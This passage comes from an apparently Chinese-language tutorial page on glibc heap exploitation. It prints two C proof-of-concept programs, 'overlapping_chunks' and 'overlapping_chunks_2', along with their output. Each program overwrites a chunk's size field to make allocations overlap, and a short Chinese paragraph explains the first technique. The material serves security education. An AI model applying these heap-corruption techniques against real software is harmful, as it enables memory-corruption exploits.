</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span><span class=sc>&#39;2&#39;</span><span class=p>,</span> <span class=mh>0x100</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>p3</span><span class=p>,</span><span class=sc>&#39;3&#39;</span><span class=p>,</span> <span class=mh>0x80</span> <span class=o>-</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s free the chunk p2</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk p2 is now in the unsorted bin ready to serve possible</span><span class=se>\n</span><span class=s>new malloc() of its size</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now let&#39;s simulate an overflow that can overwrite the size of the</span><span class=se>\n</span><span class=s>chunk freed p2.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;For a toy program, the value of the last 3 bits is unimportant;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;however, it is best to maintain the stability of the heap.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;to assure that p1 is not mistaken for a free chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>evil_chunk_size</span> <span class=o>=</span> <span class=mh>0x181</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>evil_region_size</span> <span class=o>=</span> <span class=mh>0x180</span> <span class=o>-</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We are going to set the size of chunk p2 to to %d, which gives us</span><span class=se>\n</span><span class=s>a region size of %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>         <span class=n>evil_chunk_size</span><span class=p>,</span> <span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>p2</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>=</span> <span class=n>evil_chunk_size</span><span class=p>;</span> <span class=c1>// we are overwriting the &#34;size&#34; field of chunk p2
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s allocate another chunk with a size equal to the data</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;size of the chunk p2 injected size</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This malloc will be served from the previously freed chunk that</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;is parked in the unsorted bin which size has been modified by us</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>p4</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>p4 has been allocated at %p and ends at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=o>+</span><span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 starts at %p and ends at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=o>+</span><span class=mh>0x80</span><span class=o>-</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 should overlap with p3, in this case p4 includes all p3.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now everything copied inside chunk p4 can overwrites data on</span><span class=se>\n</span><span class=s>chunk p3,&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;and data written to chunk p3 can overwrite data</span><span class=se>\n</span><span class=s>stored in the p4 chunk.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s run through an example. Right now, we have:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>If we memset(p4,&#39;4&#39;, %d), we have:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>p4</span><span class=p>,</span><span class=sc>&#39;4&#39;</span><span class=p>,</span> <span class=n>evil_region_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>And if we then memset(p3,&#39;3&#39;, 80), we have:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>p3</span><span class=p>,</span><span class=sc>&#39;3&#39;</span><span class=p>,</span> <span class=mi>80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p4 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;p3 = %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This is a simple chunks overlapping problem

Let&#39;s start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x1b9a010
p2=0x1b9a110
p3=0x1b9a210

Now let&#39;s free the chunk p2
The chunk p2 is now in the unsorted bin ready to serve possible
new malloc() of its size
Now let&#39;s simulate an overflow that can overwrite the size of the
chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 385, which gives us
a region size of 376

Now let&#39;s allocate another chunk with a size equal to the data
size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that
is parked in the unsorted bin which size has been modified by us

p4 has been allocated at 0x1b9a110 and ends at 0x1b9a288
p3 starts at 0x1b9a210 and ends at 0x1b9a288
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on
chunk p3, and data written to chunk p3 can overwrite data
stored in the p4 chunk.

Let&#39;s run through an example. Right now, we have:
p4 = xK�8�
p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�

If we memset(p4,&#39;4&#39;, 376), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
p3 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�

And if we then memset(p3,&#39;3&#39;, 80), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444�
p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444�
</code></pre><p>源程序和输出结果里已经相当清晰了，这里就是修改了一个 unsorted bin 中的 free chunk 的 <code>chunk_size</code>，然后把它申请回来，这样它的一部分就和原本紧挨在下面的 chunk 重叠了，那么向它的这部分写入数据就会影响到下面的这个 chunk，反之亦然。</p><h2 id=overlapping_chunks_2 class="relative group">overlapping_chunks_2 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#overlapping_chunks_2 aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> Yet another simple tale of overlapping chunk.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> This technique is taken from
</span></span></span><span class=line><span class=cl><span class=cm> https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm> This is also referenced as Nonadjacent Free Chunk Consolidation Attack.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>p1</span><span class=p>,</span><span class=o>*</span><span class=n>p2</span><span class=p>,</span><span class=o>*</span><span class=n>p3</span><span class=p>,</span><span class=o>*</span><span class=n>p4</span><span class=p>,</span><span class=o>*</span><span class=n>p5</span><span class=p>,</span><span class=o>*</span><span class=n>p6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>real_size_p1</span><span class=p>,</span><span class=n>real_size_p2</span><span class=p>,</span><span class=n>real_size_p3</span><span class=p>,</span><span class=n>real_size_p4</span><span class=p>,</span><span class=n>real_size_p5</span><span class=p>,</span><span class=n>real_size_p6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>prev_in_use</span> <span class=o>=</span> <span class=mh>0x1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This is a simple chunks overlapping problem&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This is also referenced as Nonadjacent Free Chunk Consolidation Attack</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s start to allocate 5 chunks on the heap:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>p1</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p2</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p3</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p4</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>p5</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p1</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p2</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p3</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p4</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p5</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>chunk p1 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p1</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span><span class=o>+</span><span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p1</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p2 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p2</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p2</span><span class=o>+</span><span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p3 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p3</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=o>+</span><span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p3</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p4 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p4</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p4</span><span class=o>+</span><span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p4</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p5 from %p to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p5</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p5</span><span class=o>+</span><span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p5</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>p1</span><span class=p>,</span><span class=sc>&#39;A&#39;</span><span class=p>,</span><span class=n>real_size_p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>p2</span><span class=p>,</span><span class=sc>&#39;B&#39;</span><span class=p>,</span><span class=n>real_size_p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>p3</span><span class=p>,</span><span class=sc>&#39;C&#39;</span><span class=p>,</span><span class=n>real_size_p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>p4</span><span class=p>,</span><span class=sc>&#39;D&#39;</span><span class=p>,</span><span class=n>real_size_p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>p5</span><span class=p>,</span><span class=sc>&#39;E&#39;</span><span class=p>,</span><span class=n>real_size_p5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s free the chunk p4.</span><span class=se>\n</span><span class=s>In this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>(</span><span class=n>p4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span><span class=se>\n</span><span class=s>with the size of chunk_p2 + size of chunk_p3</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)((</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span> <span class=o>+</span> <span class=n>real_size_p1</span> <span class=p>)</span> <span class=o>=</span> <span class=n>real_size_p2</span> <span class=o>+</span> <span class=n>real_size_p3</span> <span class=o>+</span> <span class=n>prev_in_use</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>size_t</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span><span class=p>;</span> <span class=c1>//&lt;--- BUG HERE
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now during the free() operation on p2, the allocator is fooled to think that </span><span class=se>\n</span><span class=s>the nextchunk is p4 (since p2 + size_p2 now point to p4) </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>This operation will basically create a big free chunk that wrongly includes p3</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>free</span><span class=p>(</span><span class=n>p2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>p6</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>2000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>real_size_p6</span> <span class=o>=</span> <span class=nf>malloc_usable_size</span><span class=p>(</span><span class=n>p6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and </span><span class=se>\n</span><span class=s>we can overwrite data in p3 by writing on chunk p6</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p6 from %p to %p&#34;</span><span class=p>,</span> <span class=n>p6</span><span class=p>,</span>  <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p6</span><span class=o>+</span><span class=n>real_size_p6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>chunk p3 from %p to %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p3</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>p3</span><span class=o>+</span><span class=n>real_size_p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Data inside chunk p3: </span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s write something inside p6</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>p6</span><span class=p>,</span><span class=sc>&#39;F&#39;</span><span class=p>,</span><span class=mi>1500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Data inside chunk p3: </span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;%s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This is a simple chunks overlapping problem
This is also referenced as Nonadjacent Free Chunk Consolidation Attack

Let&#39;s start to allocate 5 chunks on the heap:

chunk p1 from 0x17c9010 to 0x17c93f8
chunk p2 from 0x17c9400 to 0x17c97e8
chunk p3 from 0x17c97f0 to 0x17c9bd8
chunk p4 from 0x17c9be0 to 0x17c9fc8
chunk p5 from 0x17c9fd0 to 0x17ca3b8

Let&#39;s free the chunk p4.
In this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4

Let&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2
with the size of chunk_p2 + size of chunk_p3

Now during the free() operation on p2, the allocator is fooled to think that
the nextchunk is p4 (since p2 + size_p2 now point to p4)

This operation will basically create a big free chunk that wrongly includes p3

Now let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk

Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and
we can overwrite data in p3 by writing on chunk p6

chunk p6 from 0x17c9400 to 0x17c9bd8
chunk p3 from 0x17c97f0 to 0x17c9bd8

Data inside chunk p3:

